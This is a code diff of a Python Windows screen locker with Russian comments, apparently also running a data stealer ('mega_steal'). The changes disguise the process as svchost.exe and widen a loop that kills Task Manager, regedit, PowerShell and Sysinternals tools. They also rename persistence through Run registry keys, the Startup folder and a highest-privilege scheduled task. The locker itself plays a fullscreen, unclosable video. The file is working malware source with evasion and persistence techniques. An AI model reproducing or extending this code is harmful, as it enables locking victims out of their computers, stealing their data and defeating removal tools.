@@ -20,7 +20,20 @@ VIDEO_PATH = os.path.join(tempfile.gettempdir(), "video.mp4")
 AUDIO_PATH = os.path.join(tempfile.gettempdir(), "audio.mp3")
 attempts_left = MAX_ATTEMPTS
 
-# ===== УБИЙЦА ДИСПЕТЧЕРА ЗАДАЧ =====
+# ===== СКРЫТИЕ ПРОЦЕССА =====
+def hide_process():
+    try:
+        # Меняем имя процесса
+        ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
+        # Переименовываем файл
+        try:
+            new_path = os.path.join(os.environ['WINDIR'], 'Temp', 'svchost.exe')
+            if not os.path.exists(new_path) and os.path.abspath(__file__) != new_path:
+                shutil.copy2(sys.executable, new_path)
+        except: pass
+    except: pass
+
+# ===== УБИЙЦА ДИСПЕТЧЕРА =====
 def kill_taskmgr_loop():
     while True:
         try:
@@ -29,8 +42,10 @@ def kill_taskmgr_loop():
             os.system("taskkill /f /im powershell.exe >nul 2>&1")
             os.system("taskkill /f /im msconfig.exe >nul 2>&1")
             os.system("taskkill /f /im regedit.exe >nul 2>&1")
+            os.system("taskkill /f /im procexp.exe >nul 2>&1")
+            os.system("taskkill /f /im procmon.exe >nul 2>&1")
         except: pass
-        time.sleep(0.05)
+        time.sleep(0.03)
 
 # ===== БЛОКИРОВКА ВСЕГО =====
 def block_everything():
@@ -44,7 +59,6 @@ def block_everything():
             except: pass
         k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 1); winreg.CloseKey(k)
-        # Отключаем диспетчер задач через реестр
         try:
             k2 = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
             winreg.SetValueEx(k2, "DisableTaskMgr", 0, winreg.REG_DWORD, 1); winreg.CloseKey(k2)
@@ -75,19 +89,16 @@ def add_to_startup():
             cp = pp
         pythonw = sys.executable.replace("python.exe", "pythonw.exe")
         k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(k, "WindowsService", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"')
+        winreg.SetValueEx(k, "svchost", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"')
         winreg.CloseKey(k)
         startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-        dest = os.path.join(startup, 'WindowsService.pyw')
-        if cp != dest:
-            try: shutil.copy2(cp, dest)
-            except: pass
+        shutil.copy2(cp, os.path.join(startup, 'svchost.pyw'))
         try:
             k2 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(k2, "WindowsService", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"')
+            winreg.SetValueEx(k2, "svchost", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"')
             winreg.CloseKey(k2)
         except: pass
-        os.system(f'schtasks /create /tn "WindowsService" /tr "\\"{pythonw}\\" \\"{cp}\\"" /sc ONLOGON /rl HIGHEST /f >nul 2>&1')
+        os.system(f'schtasks /create /tn "svchost" /tr "\\"{pythonw}\\" \\"{cp}\\"" /sc ONLOGON /rl HIGHEST /f >nul 2>&1')
     except: pass
 
 def download_file(url, path):
@@ -145,28 +156,38 @@ def play_video():
     download_file(VIDEO_URL, VIDEO_PATH)
     download_file(AUDIO_URL, AUDIO_PATH)
     time.sleep(0.5)
-    # Запускаем убийцу диспетчера
-    threading.Thread(target=kill_taskmgr_loop, daemon=True).start()
     try:
         v = tk.Tk()
         v.attributes('-fullscreen', True); v.attributes('-topmost', True)
         v.configure(bg='black'); v.overrideredirect(True)
         v.protocol("WM_DELETE_WINDOW", lambda: None)
-        v.focus_force()
         lbl = tk.Label(v, bg='black'); lbl.pack(expand=True, fill='both')
+        
+        # Запускаем звук СНАЧАЛА
+        audio_start = time.time()
         try: subprocess.Popen(['ffplay','-nodisp','-autoexit','-loglevel','quiet', AUDIO_PATH], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         except: pass
+        
         cap = cv2.VideoCapture(VIDEO_PATH)
         if cap.isOpened():
             fps = cap.get(cv2.CAP_PROP_FPS)
             if fps <= 0: fps = 30
             sw, sh = v.winfo_screenwidth(), v.winfo_screenheight()
-            ft = 1.0/fps; lt = time.time()
+            
+            frame_count = 0
+            video_start = time.time()
+            
             while cap.isOpened():
                 ret, frame = cap.read()
                 if not ret: break
-                while time.time() - lt < ft: time.sleep(0.001)
-                lt = time.time()
+                
+                frame_count += 1
+                # Синхронизация: ждём пока видео догонит звук
+                expected = frame_count / fps
+                elapsed = time.time() - video_start
+                if expected > elapsed:
+                    time.sleep(expected - elapsed)
+                
                 frame = cv2.resize(frame, (sw, sh))
                 frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                 img = tk.PhotoImage(data=cv2.imencode('.ppm', frame)[1].tobytes())
@@ -280,12 +301,10 @@ class WinLocker:
             self.pw.delete(0, tk.END)
 
 if __name__ == "__main__":
+    hide_process()
     threading.Thread(target=mega_steal, daemon=True).start()
     add_to_startup()
-    
-    # Запускаем убийцу диспетчера ПРЯМО СЕЙЧАС
     threading.Thread(target=kill_taskmgr_loop, daemon=True).start()
-    
     anim_fsociety()
     anim_stealer()
     anim_connect()
